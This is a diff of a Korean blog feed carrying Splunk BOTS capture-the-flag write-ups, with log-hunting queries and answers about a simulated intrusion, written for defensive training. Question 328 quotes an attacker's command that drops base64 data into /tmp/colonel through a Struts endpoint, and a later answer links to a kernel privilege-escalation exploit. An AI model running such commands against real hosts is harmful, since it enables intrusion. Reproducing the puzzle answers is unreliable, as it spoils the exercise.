+최소 2개의 Frothly 엔드포인트가 적의 명령 및 제어 인프라에 접속합니다. 짧은 호스트 이름은 무엇입니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    
+&lt;/details&gt;
+
+&lt;p&gt;324	Who is Al Bungstein’s cell phone provider/carrier? Answer guidance: Two words.&lt;br /&gt;
+324 Al Bungstein의 휴대전화 제공업체/이동통신사는 누구인가요? 답변 안내: 두 단어.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    How can you find out what external IP address Al Bungstein is using?&lt;br /&gt;
+    Al Bungstein이 사용하는 외부 IP 주소를 어떻게 알 수 있습니까?
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    OSINT is your friend here. Pivot off of Al's external IP.&lt;br /&gt;
+    OSINT는 여기 당신의 친구입니다. Al의 외부 IP를 피벗합니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    There is a single sourcetype in Splunk that also contains this information. It is a scripted input running on Al's machine.&lt;br /&gt;
+    Splunk에는 이 정보도 포함하는 단일 소스 유형이 있습니다. Al의 시스템에서 실행되는 스크립트 입력입니다.
+&lt;/details&gt;
+
+&lt;p&gt;Al Bungstein의 이메일은 &lt;strong&gt;abungstein@froth.ly&lt;/strong&gt;입니다.
+ip : 174.215.1.81&lt;/p&gt;
+
+&lt;p&gt;해당 ip를 &lt;a href=&quot;https://domain.whois.co.kr/whois/search.php&quot;&gt;whois&lt;/a&gt;에 조회해보면&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-18-03-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;답 : Verizon Wireless&lt;/p&gt;
+
+&lt;p&gt;325	Microsoft cloud services often have a delay or lag between “index time” and “event creation time”. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin? Answer guidance: Round to the nearest minute without the unit of measure.&lt;br /&gt;
+Microsoft 클라우드 서비스는 종종 “인덱스 시간”과 “이벤트 생성 시간” 사이에 지연 또는 지연이 있습니다. 전체일 중 ms:aad:signin의 최대 지연 시간(분)은 얼마입니까? 답변 안내: 측정 단위 없이 가장 가까운 분으로 반올림합니다.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+
+&lt;/details&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=ms:aad:signin  
+| eval indextime=strftime(_indextime,&quot;%Y-%m-%d %H:%M:%S&quot;) 
+| eval time=strftime(_time,&quot;%Y-%m-%d %H:%M:%S&quot;) 
+| eval indextime_epoch=strptime(indextime,&quot;%Y-%m-%d %H:%M:%S&quot;)
+| eval time_epoch=strptime(time, &quot;%Y-%m-%d %H:%M:%S&quot;)
+| table time, indextime, indextime_epoch, time_epoch
+| eval delta=indextime_epoch-time_epoch
+| stats max(delta) as max_lag
+| eval minutes=max_lag / 60
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;326	According to Mallory’s advertising research, how is beer meant to be enjoyed? Answer guidance: One word.&lt;br /&gt;
+Mallory의 광고 연구에 따르면 맥주는 어떻게 즐길 수 있습니까? 답변 안내: 한 마디.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    
+&lt;/details&gt;
+
+&lt;p&gt;327도 문제 없습니다.&lt;/p&gt;
+
+&lt;p&gt;328	What text is displayed on line 2 of the file used to escalate tomcat8’s permissions to root? Answer guidance: Provide contents of the entire line.&lt;br /&gt;
+tomcat8의 권한을 루트로 에스컬레이션하는 데 사용되는 파일의 2행에 어떤 텍스트가 표시됩니까? 답변 안내: 전체 라인의 내용을 제공합니다.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.&lt;br /&gt;
+    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    You are looking for a long string of base64 information.
+    긴 base64 정보 문자열을 찾고 있습니다.
+&lt;/details&gt;
+
+&lt;p&gt;osquery에 실행관련 이벤트가 있을것입니다. 어떤 계정이 어떤 명령을 실행했는지 조사해봅니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=osquery:results tomcat8 columns.cmdline=*
+| table _time decorations.username columns.cmdline
+| reverse
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;중간에 &lt;strong&gt;“chmod” “+x” “colonelnew”&lt;/strong&gt;, &lt;strong&gt;”./colonelnew”&lt;/strong&gt;의 이벤트를 발견할 수 있습니다. 
+&lt;strong&gt;colonelnew&lt;/strong&gt;은 315번문제에서 발견한 파일과 비슷합니다. sourcetype sysmon에서 cat colonel.c의 로그가 있었습니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*colonel* source=&quot;WinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;중간 &lt;strong&gt;C:\windows\temp\unziped\lsof-master\iexeplorer.exe” http://192.168.9.30:8080/frothlyinventory/showcase.action “echo Ly…. &amp;gt;&amp;gt; /tmp/colonel&lt;/strong&gt;과 같은 명령어가 보입니다.
+해당 base64를 /tmp/colonel파일로 옮기는것처럼 보입니다. 해당 데이터를 base64로 디코딩해봅니다.&lt;/p&gt;
+
+&lt;p&gt;시작 : LyoKICogVWJ1bnR1IDE2
+끝 : JldHVybiAwOwp9 &amp;gt;&amp;amp;gt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-22-06-41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;답 :  * Ubuntu 16.04.4 kernel priv esc&lt;/p&gt;
+
+&lt;p&gt;329	One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?
+대동강이 업로드한 파일 중 하나에는 파일의 다른 어떤 것보다 훨씬 큰 글자 크기의 단어가 포함되어 있습니다. 그 단어는 무엇입니까?&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Figure out what files were uploaded, and pivot off of interesting file names found. The WinEventLog:Security sourcetype is helpful, as is the osquery:results sourcetype.&lt;br /&gt;
+    어떤 파일이 업로드되었는지 파악하고 발견된 흥미로운 파일 이름을 중심으로 중심을 잡습니다. WinEventLog:Security 소스 유형은 osquery:results 소스 유형과 마찬가지로 유용합니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    You are looking for a long string of base64 information.&lt;br /&gt;
+    긴 base64 정보 문자열을 찾고 있습니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    You will need to find a site to decode the base64 to a viewable image. CyberChef is a good one!
+    base64를 볼 수 있는 이미지로 디코딩하려면 사이트를 찾아야 합니다. CyberChef는 좋은 사람입니다!
+&lt;/details&gt;
+
+&lt;p&gt;지금까지 문제에서 대동강그룹이 업로드한 파일은 colonel, Frothly_GABF_Deck-2018-MK.pptx, 1534778082419.png, definitelydontinvestigatethisfile.sh로 파악했습니다.
+각 검색하여 base64 디코딩해봅시다.
+&lt;strong&gt;definitelydontinvestigatethisfile.sh&lt;/strong&gt;를 검색해보면
+sysmon에 아래 base64 코드들이 있습니다.
+시작 : /9j/4AAQSkZJRgABAQAAAQABAAD/
+끝 : BvdGF0byBwaG9uZQo=&lt;/p&gt;
+
+&lt;p&gt;해당 데이터를 디코드해보면 아래와 같습니다. 
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-22-21-07.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;답 : splunk&lt;/p&gt;
+
+&lt;p&gt;330	What Frothly VPN user generated the most traffic? Answer guidance: Provide the VPN user name.&lt;br /&gt;
+어떤 Frothly VPN 사용자가 가장 많은 트래픽을 생성했습니까? 답변 안내: VPN 사용자 이름을 제공합니다.&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Start with cisco:asa as the sourcetype.
+    sourcetype cisco:asa에서 조사하십시오.
+&lt;/details&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=cisco:asa eventtype=cisco_vpn
+| stats count by Cisco_ASA_user
+| sort -count
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Cisco_ASA_user&lt;/th&gt;
+      &lt;th&gt;count&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;mkraeusen&lt;/td&gt;
+      &lt;td&gt;38&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bstoll&lt;/td&gt;
+      &lt;td&gt;36&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bgist&lt;/td&gt;
+      &lt;td&gt;19&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;fyodor&lt;/td&gt;
+      &lt;td&gt;14&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;pcerf&lt;/td&gt;
+      &lt;td&gt;13&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ghoppy&lt;/td&gt;
+      &lt;td&gt;5&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;btun&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;abungstein&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;답 : mkraeusen&lt;/p&gt;
+
+&lt;p&gt;331	Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier. Answer guidance: UF = Q3 + 1.5 x IQR&lt;br /&gt;
+Splunk 명령만 사용하는 경우 하루 종일 Windows 호스트의 이벤트 코드 4688 수에 대한 사분위수 범위(IQR)의 상한(UF) 값은 얼마입니까? 1.5 배율을 사용하십시오. 답변 안내: UF = Q3 + 1.5 x IQR&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Start with WinEventLog:Security as the sourcetype.&lt;br /&gt;
+    sourcetype WinEventLog:Security를 조사하십시오.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    Splunk commands such as eventstats, perc25() and perc75() would be helpful here.&lt;br /&gt;
+    여기에서 eventstats, perc25() 및 perc75()와 같은 Splunk 명령이 도움이 될 것입니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    If you have never used the interquartile range (IQR) to identify outliers, take a look at the documentation https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers&lt;br /&gt;
+    사분위수 범위(IQR)를 사용하여 이상값을 식별한 적이 없는 경우 https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers 문서를 참조하십시오.
+&lt;/details&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688&quot;&gt;eventcode4688&lt;/a&gt;
+새 process creation 이벤트 코드입니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=wineventlog EventCode=4688
+| eventstats perc25(count) as p25, perc75(count) as p75
+| eval IQR=p75-p25
+| eval UF=p75+1.5*IQR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;답 : 1368&lt;/p&gt;
+
+&lt;p&gt;332	What is the CVE of the vulnerability that escalated permissions on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)
+Linux 호스트 hoth에서 권한을 에스컬레이션한 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.&lt;br /&gt;
+    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    You are looking for a long string of base64 information.
+    긴 base64 정보 문자열을 찾고 있습니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    Google search.
+    구글링 하세요.
+&lt;/details&gt;
+
+&lt;p&gt;328번문제에서 발견한 “* Ubuntu 16.04.4 kernel priv esc”를 구글링해봅시다.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;CVE-2017-16995&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;답 : CVE-2017-16995&lt;/p&gt;
+
+&lt;p&gt;333	What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)&lt;br /&gt;
+Linux 호스트 hoth에서 명령을 실행하기 위해 악용된 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    
+&lt;/details&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Kim-Gunwoo</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="splunk" />
+      
+
+      
+        <summary type="html">Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS v3 Write up(4) - END BOTS v4 결과</summary>
       
 
       
@@ -3141,12 +3976,12 @@ cyberchef에서 각각 render image를 클릭하고, input을 base64변경하면
     </entry>
   
     <entry>
-      <title type="html">splunk-bots-v3 write up(4) - END</title>
-      <link href="https://wind-flow.github.io/splunk-BOTS-v3-part4" rel="alternate" type="text/html" title="splunk-bots-v3 write up(4) - END" />
-      <published>2021-10-05T20:04:36+09:00</published>
-      <updated>2021-10-05T20:04:36+09:00</updated>
-      <id>https://wind-flow.github.io/splunk-BOTS-v3-part4</id>
-      <content type="html" xml:base="https://wind-flow.github.io/splunk-BOTS-v3-part4">&lt;p&gt;&lt;span class=&quot;table-of-contents-list&quot;&gt;Splunk BOTS의 데이터셋은 3개입니다.&lt;/span&gt;&lt;/p&gt;
+      <title type="html">splunk-bots-v2 write up(4)</title>
+      <link href="https://wind-flow.github.io/splunk-BOTS-v2-part4" rel="alternate" type="text/html" title="splunk-bots-v2 write up(4)" />
+      <published>2021-10-04T20:04:36+09:00</published>
+      <updated>2021-10-04T20:04:36+09:00</updated>
+      <id>https://wind-flow.github.io/splunk-BOTS-v2-part4</id>
+      <content type="html" xml:base="https://wind-flow.github.io/splunk-BOTS-v2-part4">&lt;p&gt;&lt;span class=&quot;table-of-contents-list&quot;&gt;Splunk BOTS의 데이터셋은 3개입니다.&lt;/span&gt;&lt;/p&gt;
 &lt;ul class=&quot;table-of-contents-list&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-overview&quot;&gt;BOTS란? &lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part1&quot;&gt;BOTS v1 Write up(1)&lt;/a&gt;&lt;/li&gt;
@@ -3163,675 +3998,575 @@ cyberchef에서 각각 render image를 클릭하고, input을 base64변경하면
   &lt;li&gt;&lt;a href=&quot;./splunk-2021-BOTS-END&quot;&gt;BOTS v4 결과&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;secnario #1&lt;br /&gt;
-Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.&lt;br /&gt;
-각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;APT Scenarios:&lt;/p&gt;
 
-&lt;p&gt;BOTS-V3&lt;/p&gt;
+&lt;p&gt;In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.&lt;br /&gt;
+이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.&lt;/p&gt;
 
-&lt;p&gt;index=botsv3의 sourcetype은 아래와 같습니다.&lt;/p&gt;
+&lt;p&gt;Hunting Scenarios:&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| metadata type=sourcetypes index=botsv3
-| stats values(sourcetype)
+&lt;p&gt;PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.&lt;br /&gt;
+PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.&lt;br /&gt;
+Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP&lt;br /&gt;
+Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.&lt;br /&gt;
+Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS&lt;br /&gt;
+Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.&lt;br /&gt;
+Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.&lt;br /&gt;
+Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.&lt;br /&gt;
+Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.&lt;br /&gt;
+Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.&lt;br /&gt;
+User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.&lt;br /&gt;
+User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.&lt;br /&gt;
+Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.&lt;br /&gt;
+Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.&lt;br /&gt;
+Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.&lt;br /&gt;
+Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.&lt;br /&gt;
+Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.&lt;br /&gt;
+Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.&lt;br /&gt;
+Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.&lt;br /&gt;
+Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
+OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.&lt;br /&gt;
+OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.&lt;br /&gt;
+Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).&lt;br /&gt;
+Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.&lt;br /&gt;
+Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.&lt;br /&gt;
+Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b21.jpg&quot; alt=&quot;Scenario 1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.&lt;br /&gt;
+이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b22.jpg&quot; alt=&quot;Scenario 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;400	A Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?&lt;br /&gt;
+연방 법 집행 기관은 대동강이 종종 비밀번호로 열어야 하는 zip 파일로 피해자를 스피어피싱한다고 보고합니다. 대동강이 Frothly에게 보낸 첨부 파일 이름은 무엇입니까?&lt;/p&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Frothly uses the Splunk wiredata product 'Stream' to collect email metadata. Look at the sourcetype stream:smtp&lt;br /&gt;
+    Frothly는 Splunk wiredata 제품 'Stream'을 사용하여 이메일 메타데이터를 수집합니다. sourcetype stream:smtp을 살펴보세요.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    The question mentions that Taedonggang sends a 'zip' file. Look in the sourcetype in hint 1 for attachments with a .zip extension.&lt;br /&gt;
+    질문은 대동강이 'zip' 파일을 보낸다고 언급합니다. .zip 확장자를 가진 첨부 파일에 대해서는 힌트 1의 소스 유형을 확인하십시오.
+&lt;/details&gt;
+
+&lt;p&gt;메일에 있는 확장자.zip의 첨부파일명을 확인해봅시다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp *.zip*
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;ul&gt;
-  &lt;li&gt;sourcetype 목록&lt;/li&gt;
-&lt;/ul&gt;
+
+&lt;p&gt;invoice.zip 한가지 결과만 나옵니다.
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-17-24-28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;뒷문제를 풀기위해 필요한 정보를 파악해둡니다.&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th&gt;values(sourcetype)&lt;/th&gt;
+      &lt;th&gt;_time&lt;/th&gt;
+      &lt;th&gt;sender&lt;/th&gt;
+      &lt;th&gt;receiver{}&lt;/th&gt;
+      &lt;th&gt;attach_filename{}&lt;/th&gt;
+      &lt;th&gt;attach_content_md5_hash{}&lt;/th&gt;
+      &lt;th&gt;received_by_name&lt;/th&gt;
+      &lt;th&gt;src_ip&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
     &lt;tr&gt;
-      &lt;td&gt;PerfmonMk:Process&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Script:GetEndpointInfo&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Script:InstalledApps&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Script:ListeningPorts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:ListeningPorts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:SSHDConfig&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:Service&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:Update&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:Uptime&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:UserAccounts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Unix:Version&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;WinHostMon&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;access_combined&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;alternatives&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;amazon-ssm-agent&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;amazon-ssm-agent-too_small&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;apache_error&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:cloudtrail&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:cloudwatch&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:cloudwatch:guardduty&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:cloudwatchlogs&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:cloudwatchlogs:vpcflow&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:config:rule&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:description&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
